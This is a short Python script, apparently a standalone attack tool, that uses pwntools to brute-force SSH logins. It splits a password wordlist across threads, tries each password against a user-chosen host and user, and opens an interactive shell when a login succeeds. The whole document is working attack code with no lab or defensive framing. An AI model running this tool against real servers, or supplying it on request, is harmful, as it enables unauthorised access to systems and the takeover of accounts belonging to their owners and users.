#!/usr/bin/python3

from pwn import ssh
import threading


def try_login(host, port, user, password):
    for passwd in password:
        try:
            con = ssh(user=user, host=host, port=port, password=passwd)
            print(f'Password is ..., {passwd}')
            con.interactive()
        except:
            pass


def main():
    
    user = input('Enter user name : ')
    host = input('Enter host name : ')
    port = int(input('Enetr port name : '))
    filename = input('Enter wordlist path : ')
    thread_lmt = int(input('Enter the total thrad limit : '))

    passfile = open(filename)
    passwords = passfile.readlines()

    length = len(passwords)//thread_lmt
    threads = []

    for i in range(0, len(passwords), length):

        wrap = passwords[i:i+length]
        brute = threading.Thread(target=try_login, args=[
            host, port, user, wrap])
        brute.start()
        threads.append(brute)

    for thread in threads:
        thread.join()

    # try_login(host, port, user, password)


if __name__ == '__main__':
    main()
